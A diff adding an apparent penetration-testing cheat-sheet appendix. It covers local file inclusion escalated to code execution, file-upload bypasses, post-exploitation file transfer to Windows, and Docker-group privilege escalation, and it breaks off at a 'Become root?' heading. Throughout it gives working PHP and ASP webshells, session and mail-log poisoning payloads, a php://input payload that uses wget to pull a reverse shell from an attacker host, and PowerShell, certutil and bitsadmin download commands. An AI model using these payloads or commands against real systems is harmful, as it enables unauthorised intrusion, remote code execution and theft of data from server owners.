@@ -1,0 +1,1354 @@
+********
+Appendix
+********
+
+A1: Local File Inclusion
+========================
+
+Local File Inclusion (LFI) is a type of vulnerability concerning web server. It allow an attacker to include a local file on the web server. It occurs due to the use of not properly sanitized user input.
+
+Tools
+-----
+
+To test LFI, RFI, we can also use `Uniscan <http://tools.kali.org/web-applications/uniscan>`_ Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. 
+
+::
+
+  uniscan -h
+  OPTIONS:
+    -h  help
+    -u  <url> example: https://www.example.com/
+    -f  <file> list of url's
+    -b  Uniscan go to background
+    -q  Enable Directory checks
+    -w  Enable File checks
+    -e  Enable robots.txt and sitemap.xml check
+    -d  Enable Dynamic checks
+    -s  Enable Static checks
+    -r  Enable Stress checks
+    -i  <dork> Bing search
+    -o  <dork> Google search
+    -g  Web fingerprint
+    -j  Server fingerprint
+
+  usage:
+  [1] perl ./uniscan.pl -u http://www.example.com/ -qweds
+  [2] perl ./uniscan.pl -f sites.txt -bqweds
+  [3] perl ./uniscan.pl -i uniscan
+  [4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
+  [5] perl ./uniscan.pl -o "inurl:test"
+  [6] perl ./uniscan.pl -u https://www.example.com/ -r
+
+There's another tool called `fimap <https://tools.kali.org/web-applications/fimap>`_. However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.
+
+.. Note :: Also, if we have unprivileged user shell or an ability to store a file somewhere in the filesystem, however don't have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.
+
+Filtering in LFI
+^^^^^^^^^^^^^^^^
+
+Sometimes, there might be some filtering applied by default. For example: filename=secret.txt, here it is possible that it will only read files named secret.txt or with extension .txt. So, may be rename your payload accordingly. 
+
+For example: the below code only includes the file which are named secret
+::
+
+ <?php
+   $file = @$_GET['filname'];
+   if(strlen($file) > 55)
+      exit("File name too long.");
+   $fileName = basename($file);
+   if(!strpos($file, "secret"))
+     exit("No secret is selected.");
+   echo "<pre>";
+   include($file);
+   echo "</pre>";
+ ?>
+
+LFI to Remote Code Execution
+----------------------------
+
+Mainly taken from `LFI-Cheat-Sheet <https://highon.coffee/blog/lfi-cheat-sheet/>`_ , `Exploiting PHP File Inclusion – Overview <https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/>`_ and `Upgrade from LFI to RCE via PHP Sessions <https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/>`_
+
+There are variety of different tricks to turn your LFI into RCE. Using 
+
+File upload forms/ functions
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Figure out if there are any upload forms or functions, we will upload your malicious code to the victim server, which can be executed.
+
+PHP wrapper expect://command
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.
+
+An example of PHP expect:
+
+::
+
+ http://IP/fileincl/example1.php?page=expect://ls
+
+If PHP expect wrapper is disabled, below error is encountered.
+
+::
+
+ Warning: include(): Unable to find the wrapper "expect" - did you forget to enable it when you<br> configured PHP? in /var/www/fileincl/example1.php on line 7 
+ Warning: include(): Unable to find the<br> wrapper "expect" - did you forget to enable it when you configured PHP? in <br> /var/www/fileincl/example1.php on line 7 
+ Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 
+ Warning: include(): Failed opening 'expect://ls' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7
+
+PHP Wrapper zip
+^^^^^^^^^^^^^^^
+
+Let's say there is a upload functionality on the victim machine, however the file saved doesn't have executeable permission, in that case if we upload a zip file containing a shellcode such as
+
+Creating a php payload for listing current directory files (There can be other payload also. For example, php meterpreter, if the "system" is blocked use, scandir() for directory listing etc. )
+
+::
+
+ echo "<?php system("ls"); ?>" > shell.php
+
+and 
+
+::
+
+ zip shell.zip shell.php
+
+Now, if we upload this zip file somehow to the victim machine and know it's location (Let's say it got uploaded in /uploads) and filename (is def506bd2176265e006f2db3d7b4e9db11c459c1), we can do remote code execution
+
+`Zip Usage <http://php.net/manual/en/wrappers.compression.php>`_ 
+
+::
+
+ zip://archive.zip#dir/file.txt
+
+Burp Request
+
+::
+
+ GET /?parameter=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
+ Host: 10.50.66.93
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+
+ %23 is the #
+
+and we get RCE
+
+::
+
+ index.php
+ upload.php
+ uploads
+
+We may read more about it at `Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up <https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/>`_ or `CodeGate General CTF 2015: Owlur <https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur>`_ -- Read other write-ups in this. 
+
+PHP Wrapper phar
+^^^^^^^^^^^^^^^^
+
+RCE can also be done using `Using Phar Archives: the phar stream wrapper <http://php.net/manual/en/phar.using.stream.php>`_ 
+
+PHP wrapper php://file
+^^^^^^^^^^^^^^^^^^^^^^
+PHP wrapper php://filter
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.
+
+The output is encoded using base64, so you’ll need to decode the output.
+
+::
+
+ http://IP/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+
+or
+
+We could use php filter to read the source code of a PHP File
+
+:: 
+
+  http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
+
+More information can be found at `Using PHP for file inclusion <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>`_
+
+PHP input:// stream
+^^^^^^^^^^^^^^^^^^^
+
+php://input allows you to read raw POST data. It is a less memory intensive alternative to $HTTP_RAW_POST_DATA and does not need any special php.ini directives. php://input is not available with enctype=”multipart/form-data”.
+
+Send your payload in the POST request using curl, burp.
+
+Example:
+
+::
+
+ http://IP/fileincl/example1.php?page=php://input
+
+
+Post Data payload:
+
+::
+
+  <? system('wget http://IP/php-reverse-shell.php -O /var/www/shell.php');?>
+
+After uploading execute the reverse shell at 
+
+::
+
+ http://IP/shell.php
+
+data://text/plain;base64,command
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+/proc/self/environ
+^^^^^^^^^^^^^^^^^^
+
+If it’s possible to include /proc/self/environ from your vulnerable LFI script, then code execution can be leveraged by manipulating the User Agent parameter with Burp. After the PHP code has been introduced /proc/self/environ can be executed via your vulnerable LFI script.
+
+/proc/self/fd
+^^^^^^^^^^^^^
+
+If it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the referer.
+
+This method is a little tricky as the proc file that contains the Apache error log information changes under /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc. 
+Utilize `LFI-LogFileCheck.txt <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion%20-%20Path%20Traversal/Intruders/LFI-LogFileCheck.txt>`_ with Burp Intruder, and check for the returned page sizes.
+
+Control over PHP Session Values
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Let's say, a vulnerable page is present with the post request
+
+::
+
+ POST /upload/? HTTP/1.1
+ Host: vulnerable.redacted.com
+ User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-US,en;q=0.5
+ Content-Type: application/x-www-form-urlencoded
+ Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
+ Content-Length: 44
+ Connection: close
+ Upgrade-Insecure-Requests: 1
+ 
+ login=1&user=admin&pass=admin&lang=en_us.php
+
+with LFI
+
+::
+
+ login=1&user=admin&pass=admin&lang=../../../../../../../../../../etc/passwd
+
+Now, the server store cookies
+
+::
+
+ Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
+ Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
+ Set-Cookie: pass=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
+
+As we know PHP5 stores it’s session files by default under /var/lib/php5/sess_[PHPSESSID]. (If not, do check phpinfo and figure out the location of temp files) – so the above issued session “i56kgbsq9rm8ndg3qbarhsbm27” would be stored under /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+
+Now, we can write the cookie with a php command
+
+::
+
+ POST /upload/? HTTP/1.1
+ Host: vulnerable.redacted.com
+ User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-US,en;q=0.5
+ Content-Type: application/x-www-form-urlencoded
+ Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
+ Content-Length: 134
+ Connection: close
+ Upgrade-Insecure-Requests: 1
+
+ login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
+
+This would result in 
+
+::
+
+ Set-Cookie: user=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E; expires=Mon, 13-Aug-2018 20:40:53 GMT; path=/; httponly
+
+Now, the php command can be executed using
+
+::
+
+ POST /upload/? HTTP/1.1
+ Host: vulnerable.redacted.com
+ User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-US,en;q=0.5
+ Content-Type: application/x-www-form-urlencoded
+ Content-Length: 141
+ Connection: close
+ Upgrade-Insecure-Requests: 1
+
+ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+
+The session file could again afterwards be included using the LFI (note that you need to remove the cookie from the request, otherwise it would get overwritten again and the payload would fail)
+
+Email Server 
+^^^^^^^^^^^^
+
+If the email server allows you to send email unauthorized and we know the usernames on the system, we probably can utilize it to do remote code execution by using telnet and connecting to port 25
+
+::
+
+ EHLO example.com
+ VRFY username@example.com
+ MAIL FROM: pwned@domain.com
+ RCPT TO: username@example.com
+ DATA
+
+ Subject: Owned
+ <?php echo system($_REQUEST['cmd']); ?>
+
+ .
+
+ Mail Queued
+
+and as we have LFI, we can read the email by 
+
+::
+
+ ../../../var/mail/username &cmd=whoami
+
+The above would probably differ on the request of your LFI.
+
+
+
+.. _A2-File-Upload:
+
+A2: File Upload
+===============
+
+Examples
+--------
+
+.. Note :: If sometimes, we are trying to upload a php file and it's not a allowed extension, maybe try with php5 extension. The file extension tells the web server which version of PHP to use. 
+           Some web servers are set up so that PHP 4 is the default, and you have to use .php5 to tell it to use PHP 5.
+
+Simple File Upload
+^^^^^^^^^^^^^^^^^^
+
+Intercepting the request in Burp/ ZAP and changing the file-extension.
+
+Below is the PHP code
+
+::
+
+  <?  
+
+  function genRandomString() { 
+    $length = 10; 
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
+    $string = "";     
+
+    for ($p = 0; $p < $length; $p++) { 
+        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
+    } 
+
+    return $string; 
+  } 
+
+  function makeRandomPath($dir, $ext) { 
+    do { 
+    $path = $dir."/".genRandomString().".".$ext; 
+    } while(file_exists($path)); 
+    return $path; 
+  } 
+
+  function makeRandomPathFromFilename($dir, $fn) { 
+    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
+    return makeRandomPath($dir, $ext); 
+  } 
+
+  if(array_key_exists("filename", $_POST)) { 
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
+        echo "File is too big"; 
+    } else { 
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
+        } else{ 
+            echo "There was an error uploading the file, please try again!"; 
+        } 
+    } 
+  } else { 
+  ?> 
+  <form enctype="multipart/form-data" action="index.php" method="POST">  
+  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
+  <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />  
+  Choose a JPEG to upload (max 1KB):<br/>  
+  <input name="uploadedfile" type="file" /><br />  
+  <input type="submit" value="Upload File" />  
+  </form>  
+  <? } ?>   
+
+If we change the extension of filename tag from JPG to PHP, we may be able to execute code remotely.
+
+* Create a fake JPG containing php code.
+
+  We’ll be using system() to read our password.
+
+ ::
+
+   echo "<?php system($_GET["cmd"]); ?>" > shell.jpg  
+
+* Upload JPG, intercept in Burp/ ZAP and change the extension
+
+ ::
+
+   <input name="filename" value="o0xn5q93si.jpg" type="hidden">  
+
+  is changed to
+
+ ::
+
+  <input name="filename" value="o0xn5q93si.php" type="hidden">  
+
+Simple File Upload - With verifying image type
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+In this the above PHP code remain almost the same apart from little addition that we check the filetype of the file uploaded
+
+::
+
+  <?php  
+  ...  
+  
+  else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
+        echo "File is not an image";  
+    }  
+  
+  ...  
+  
+  ?> 
+
+Since the exif_imagetype function checks the filetype of the uploaded file. It checks the first bytes of an image are against a signature. Most filetypes such as JPEG, ZIP, TAR, etc. have a "Magic Number" at the beginning of the file to help verify its file type. So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.
+
+* Take a valid file (JPG or whichever file format, we are trying to bypass), take the valid hexdump of that file (Let's say first 100 bytes)
+
+ ::
+
+   hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg
+
+   -n length         : Interpret only length bytes of Input
+   -e format_string  : Specify a format string to be used for displaying data
+
+ Example:
+ 
+ ::
+
+   hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg
+   \xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x01\x2C\x01\x2C\x00\x00\xFF\xE1\x00\x16\x45\x78\x69\x66\x00\x00\x4D\x4D\x00\x2A\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\xFF\xDB\x00\x43\x00\x05\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06\x07\x0C\x08\x07\x07\x07\x07\x0F\x0B\x0B\x09\x0C\x11\x0F\x12\x12\x11\x0F\x11\x11\x13\x16\x1C\x17\x13\x14\x1A\x15\x11\x11\x18\x21\x18\x1A\x1D\x1D\x1F
+  
+* Create a file with JPG header and command shell code using python
+
+  ::
+
+   >>> fh = open('shell.php','w')  
+   >>> fh.write('The Hexdump from above \xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
+   >>> fh.close()   
+
+.. Tip :: Do check the source code of the page for any client-side file validation or any commented hidden parameters?
+
+We can also upload an actual .jpeg, but alter the coments in the metadata to include the php code.
+
+Modifying File Upload Page
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Upload forms are client-side, we can probably modify them using Inspect Element or F12. If by-chance, there's a LFI and we have seen the code of upload function. The first thing to check would be "What are the restrictions on upload i.e. Either only jpg file extension is uploaded or is file content is also check etc."
+
+Let's say, there is a upload form which has a text-field for accepting input (Let's say - suspectinfo) and the input put in this text field is stored in a file format on the server. Let's see the current form in inspect-element.
+
+Client-Side Code
+
+::
+
+ <form enctype="multipart/form-data" action="?op=upload" method="POST">
+    <textarea style="width:400px; height:150px;" id="sinfo" name="sinfo"> </textarea><br>
+	<input type="text" id="name" name="name" value="" style="width:355px;">
+    <input type="submit" name="submit" value="Send Tip!">
+ </form>
+
+If we see the above form, accepts two inputs
+
+* text type field named sinfo for providing detailed information about the server and
+* text type field named name for providing name of the server.
+
+Let's also see, serverside code
+
+::
+
+ if(isset($_POST['submit']) && isset($_POST['sinfo'])) {
+	    	$tip = $_POST['sinfo'];
+    		$secretname = Random_Filename();  ## Generates a random file name
+            $location = Random_Number();      ## Generate a random number
+	    	file_put_contents("uploads/". $location . '/' . $secretname,  $sinfo);
+
+If we see, the contents of sinfo are directly put in a file.
+
+
+In this case, if we change the input type of sinfo from text to file. We can upload a file! Imagine uploading a zip file or php file.
+
+::
+
+ <form enctype="multipart/form-data" action="?op=upload" method="POST">
+ #  <textarea style="width:400px; height:150px;" id="sinfo" name="sinfo"> </textarea><br> ---------- We have commented this and add the below line.
+	<input type="file" id="sinfo" name="sinfo" value="" style="width:355px;">
+	<input type="text" id="name" name="name" value="" style="width:355px;">
+    <input type="submit" name="submit" value="Send Tip!">
+ </form>
+
+Now, when we press submit button, probably, just make sure that the request is quite similar to the original one and we should be able to upload the file.
+
+.. Tip :: Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!
+
+IIS - Web.config Upload
+^^^^^^^^^^^^^^^^^^^^^^^
+
+If we are able to upload a web.config file by a file upload functionality in IIS - Windows machine, there might be a possibility of remote code execution.
+
+A web.config file lets you customize the way site or a specific directory on site behaves. For example, if you place a web.config file in your root directory, it will affect your entire site. If you place it in a /content directory, it will only affect that directory.
+
+With a web.config file, you can control:
+
+* Database connection strings.
+* Error behavior.
+* Security.
+
+Refer `Upload a web.config File for Fun & Profit <https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/>`_ and `RCE by uploading a web.config <https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/>`_ 
+
+We can upload the below web.config
+
+::
+
+ <?xml version="1.0" encoding="UTF-8"?>
+ <configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+ </configuration>
+ <%
+ set cmd = Request.QueryString("cmd")
+ Set os = Server.CreateObject("WSCRIPT.SHELL")
+ output = os.exec("cmd.exe /c " + cmd).stdout.readall
+ response.write output
+ %>
+
+The above expects a parameter cmd which is executed using wscript.shell and can be executed like
+
+::
+
+  http://IP/uploads/web.config?cmd=whoami
+
+
+
+.. _A3-Tranfer-Files-From-Linux-to-Windows:
+
+A3: Transferring Files from Linux to Windows (post-exploitation)
+================================================================
+
+There would times, where we have a Windows Shell (Command Prompt) and need to copy over some files to the Windows OS. Most of the stuff has been completely taken from `Transferring Files from Linux to Windows (post-exploitation) <https://blog.ropnop.com/transferring-files-from-kali-to-windows/>`_ Here are the few methods 
+
+SMB
+---
+
+We need to setup a SMB Server on the Debian/ Kali machine
+
+SMB Server - Attacker
+^^^^^^^^^^^^^^^^^^^^^
+
+We can utilize Impacket smbserver to create a SMB Server without authentication, so that anyone can access the share and download the files.
+
+::
+
+ /usr/share/doc/python-impacket/examples/smbserver.py
+ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+ usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support]
+                    shareName sharePath
+
+ This script will launch a SMB Server and add a share specified as an argument.
+ You need to be root in order to bind to port 445. No authentication will be
+ enforced. Example: smbserver.py -comment 'My share' TMP /tmp
+
+ positional arguments:
+  shareName         name of the share to add
+  sharePath         path of the share to add
+
+ optional arguments:
+  -h, --help        show this help message and exit
+  -comment COMMENT  share's comment to display when asked for shares
+  -debug            Turn DEBUG output ON
+  -smb2support      SMB2 Support (experimental!)
+
+
+So, we can setup by using
+
+::
+
+ python smbserver.py SHELLS /root/Desktop/SHELLS
+
+ Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
+
+ [*] Config file parsed
+ [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+ [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+ [*] Config file parsed
+ [*] Config file parsed
+ [*] Config file parsed
+
+
+Accessing the share - Linux
+^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+We can use smbclient to access the share
+
+::
+
+ smbclient -L 10.10.10.10 --no-pass
+ WARNING: The "syslog" option is deprecated
+
+ 	Sharename       Type      Comment
+ 	---------       ----      -------
+ 	IPC$            Disk      
+ 	SHELLS          Disk      
+  Reconnecting with SMB1 for workgroup listing.
+  Connection to localhost failed (Error NT_STATUS_NETWORK_UNREACHABLE)
+  Failed to connect with SMB1 -- no workgroup available
+
+
+Accessing the share - Windows
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+We can use net view to check the shares
+
+::
+
+ net view \\10.10.10.10
+ 
+ Shared resources at \\10.10.10.10
+
+ (null)
+
+ Share name Type Used as Comment
+ -------------------------------
+ SHELLS     Disk
+ The command completed sucessfully
+
+Copying the Files - Windows
+^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+From the Windows Command Prompt
+
+::
+
+ dir \\10.10.14.16\SHELLS
+
+ Volume in drive \\10.10.14.16\SHELLS has no label.
+ Volume Serial Number is ABCD-EFAA
+
+ Directory of \\10.10.14.16\SHELLS
+
+ 04/10/2018  11:47 AM    <DIR>          .
+ 04/08/2018  06:25 PM    <DIR>          ..
+ 04/10/2018  11:47 AM            73,802 ps.exe
+               1 File(s)        101,696 bytes
+               2 Dir(s)  15,207,469,056 bytes free
+
+
+We can directly copy the file 
+
+::
+
+ C:\Users\bitvijays\Desktop> copy \\10.10.14.16\SHELLS\ps.exe .
+        1 file(s) copied.
+
+or directly execute it without copying
+
+::
+
+ \\10.10.14.16\SHELLS\ps.exe
+
+ ps.exe can be your meterpreter exe
+
+
+HTTP
+----
+
+Setting up the Server
+^^^^^^^^^^^^^^^^^^^^^
+
+We can use python-SimpleHTTPServer to set up a HTTP Web Server
+
+::
+
+ python -m SimpleHTTPServer
+
+Accessing the Server - Windows
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+**Windows Command Prompt**
+
+We can use powershell to download a file from a command prompt
+
+::
+
+ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10:8000/ps.exe','C:\Users\bitvijays\Desktop\ps.exe')"
+
+**CertUtil**
+
+CertUtil command can be abused to download a file from internet.
+
+::
+
+ certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
+
+**Bitsadmin**
+
+::
+
+ bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10:8000/ps.exe c:\Users\bitvijays\Desktop\ps.exe
+
+
+FTP
+---
+
+We can utilize FTP to download/ upload files from a ftp server. FTP Client is usually installed on Windows by default.
+
+.. Note :: While downloading files from ftp, remember to switch to binary mode, otherwise the file could be corrupted.
+
+Setting up the Server
+^^^^^^^^^^^^^^^^^^^^^
+
+We can either use Python-pyftpdlib or Metasploit to create a FTP Server
+
+**Python-pyftpdlib**
+
+Install using apt
+
+::
+
+ apt-get install python-pyftpdlib
+
+Now from the directory we want to serve, just run the Python module. It runs on port 2121 by default (can be changed using -p parameter) and accepts anonymous authentication. To listen on the standard port: 
+
+::
+
+ /home/bitvijays/SHELLS$ python -m pyftpdlib -p 21
+
+ Usage: python -m pyftpdlib [options]
+
+ Start a stand alone anonymous FTP server.
+
+ Options:
+  -h, --help : show this help message and exit
+  -i ADDRESS, --interface=ADDRESS : specify the interface to run on (default all interfaces)
+  -p PORT, --port=PORT : specify port number to run on (default 2121)
+  -w, --write :  grants write access for logged in user (default read-only)
+  -d FOLDER, --directory=FOLDER : specify the directory to share (default current directory)
+  -n ADDRESS, --nat-address=ADDRESS : the NAT address to use for passive connections
+  -r FROM-TO, --range=FROM-TO : the range of TCP ports to use for passive connections (e.g. -r 8000-9000)
+  -D, --debug : enable DEBUG logging evel
+  -v, --version : print pyftpdlib version and exit
+  -V, --verbose : activate a more verbose logging
+  -u USERNAME, --username=USERNAME : specify username to login with (anonymous login will be disabled and password required if supplied)
+  -P PASSWORD, --password=PASSWORD : specify a password to login with (username required to be useful)
+
+**Metasploit**
+
+::
+
+  Name: FTP File Server
+  Module: auxiliary/server/ftp
+  License: Metasploit Framework License (BSD)
+  Rank: Normal
+  
+  Provided by:
+  hdm <x@hdm.io>
+
+  Available actions:
+  Name     Description
+  ----     -----------
+  Service
+
+  Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  FTPPASS                    no        Configure a specific password that should be allowed access
+  FTPROOT   /tmp/ftproot     yes       The FTP root directory to serve files from
+  FTPUSER                    no        Configure a specific username that should be allowed access
+  PASVPORT  0                no        The local PASV data port to listen on (0 is random)
+  SRVHOST   0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+  SRVPORT   21               yes       The local port to listen on.
+  SSL       false            no        Negotiate SSL for incoming connections
+  SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
+
+  Description:
+  This module provides a FTP service
+
+
+Access using FTP
+^^^^^^^^^^^^^^^^
+
+::
+
+ ftp 10.10.10.10
+ Connected to 10.10.10.10.
+ 220 FTP Server Ready
+ Name (localhost:root): anonymous
+ 331 User name okay, need password...
+ Password:
+ 230 Login OK
+ Remote system type is UNIX.
+ Using binary mode to transfer files.
+
+ ftp> ls
+ 200 PORT command successful.
+ 150 Opening ASCII mode data connection for /bin/ls
+ total 160
+ drwxr-xr-x   2 0      0       512 Jan  1  2000 ..
+ drwxr-xr-x   2 0      0       512 Jan  1  2000 .
+ -rw-r--r--   1 0      0       166 Jan  1  2000 secret.zip
+ 226 Transfer complete.
+
+ ftp> get secret.zip
+ local: secret.zip remote: secret.zip
+ 200 PORT command successful.
+ 150 Opening BINARY mode data connection for secret.zip
+ 226 Transfer complete.
+ 166 bytes received in 0.00 secs (138.4367 kB/s)
+ ftp>
+
+
+FTP can also accepts a series of commands stored in a text file
+
+Contents of a text file
+
+::
+
+ open 10.10.10.10
+ anonymous  
+ anonymous  
+ binary  
+ get ps.exe 
+ bye 
+
+
+Passing parameter to ftp
+
+::
+
+ ftp -s:filename-containing-commands
+
+The file can be created by using echo
+
+::
+
+ echo "open 10.10.10.10" >> commands.txt
+ echo "anonymous" >> commands.txt
+
+
+TFTP
+----
+
+We can also utilize TFTP to download or upload files
+
+Setting up the Server
+^^^^^^^^^^^^^^^^^^^^^
+
+Metasploit module 
+
+::
+
+ use auxiliary/server/tftp 
+ msf auxiliary(server/tftp) > info 
+
+       Name: TFTP File Server
+     Module: auxiliary/server/tftp
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+ Provided by:
+  jduck <jduck@metasploit.com>
+  todb <todb@metasploit.com>
+
+ Available actions:
+  Name     Description
+  ----     -----------
+  Service  
+
+ Basic options:
+  Name        Current Setting  Required  Description
+  ----        ---------------  --------  -----------
+  OUTPUTPATH  /tmp             yes       The directory in which uploaded files will be written.
+  SRVHOST     0.0.0.0          yes       The local host to listen on.
+  SRVPORT     69               yes       The local port to listen on.
+  TFTPROOT    /tmp             yes       The TFTP root directory to serve files from
+
+ Description:
+  This module provides a TFTP service
+
+ msf auxiliary(server/tftp) > run 
+ [*] Auxiliary module running as background job 0.
+
+ [*] Starting TFTP server on 0.0.0.0:69...
+ [*] Files will be served from /tmp
+ [*] Uploaded files will be saved in /tmp
+
+
+Accessing the Share
+^^^^^^^^^^^^^^^^^^^
+
+Downloading a file
+
+::
+
+ tftp -i 10.10.10.10 GET ps.exe
+
+Uploading a file
+
+::
+
+ tftp -i 10.10.10.10 PUT Passwords.txt
+
+Installing tftp - Windows
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+::
+
+  pkgmgr /iu:"TFTP"
+
+
+.. _A4-Linux-Group-Membership-Issues:
+
+A4: Linux Group Membership Issues
+=================================
+
+Let's examine in what groups we are members. Recommended read about groups: `Users and Groups <https://wiki.archlinux.org/index.php/users_and_groups>`_ and `System Groups <https://wiki.debian.org/SystemGroups>`_
+
+Docker Group
+---------------
+
+Any user who is part of the docker group should also be considered root. Read `Using the docker command to root the host <http://reventlov.com/advisories/using-the-docker-command-to-root-the-host>`_ Older version of docker were vulnerable to Docker breakout. More details at `Shocker / Docker Breakout PoC <https://github.com/gabrtv/shocker>`_
+
+If you are the docker user and want to get root. 
+
+Create a Dockerfile
+^^^^^^^^^^^^^^^^^^^
+
+::
+
+ mkdir docker-test
+ cd docker-test
+
+ cat > Dockerfile
+ FROM debian:wheezy
+ ENV WORKDIR /stuff
+ RUN mkdir -p $WORKDIR
+ VOLUME [ $WORKDIR ]
+ WORKDIR $WORKDIR
+
+Build the Docker
+^^^^^^^^^^^^^^^^
+
+::
+
+ docker build -t my-docker-image .
+
+
+.. Note :: If there are already docker images present on the host machine, we can utilize those also instead of making a new one. If there are none, we can copy a image to the vulnerable machine.
+
+**Copy docker images from one host to another without via repository?**
+
+Save the docker image as a tar file:
+
+::
+
+ docker save -o <path for generated tar file> <image name>
+
+Then copy the image to a new system with regular file transfer tools such as cp or scp. After that, load the image into docker:
+
+:: 
+
+ docker load -i <path to image tar file>
+
+Become root?
+^^^^^^^^^^^^
+
